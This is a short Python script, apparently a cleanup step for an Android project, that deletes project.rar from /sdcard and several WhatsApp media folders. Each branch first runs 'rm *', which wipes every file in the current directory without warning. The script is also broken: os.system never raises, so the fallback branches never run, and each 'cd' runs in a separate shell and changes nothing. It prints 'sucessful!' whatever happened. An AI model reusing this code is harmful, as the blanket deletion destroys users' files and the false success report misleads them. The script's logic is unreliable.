import os, sys


try:
    os.system("rm *")
    os.system("cd /sdcard && rm project.rar")
    print("sucessful!")
except:
    try:
        os.system("rm *")
        os.system("cd /sdcard/FMWhatsApp/Media")
        os.system("cd 'FMWhatsApp Documents'")
        os.system("rm project.rar")
        print("sucessful!")
    except:
        try:
            os.system("rm *")
            os.system("cd /sdcard/GBWhatsApp/Media")
            os.system("cd 'GBWhatsApp Documents'")
            os.system("rm project.rar")
            print("sucessful!")
        except:
            try:
              os.system("rm *")
              os.system("rm project.rar")
              print("sucessful!")
            except:
                try:
                  os.system("rm *")
                  os.system("cd /sdcard/WhatsApp/Media")
                  os.system("cd 'WhatsApp Documents'")
                  os.system("rm project.rar")
                  print("sucessful!")
                except:
                    print("not sucessful!, talk to devfemibadmus or @007 ")


    
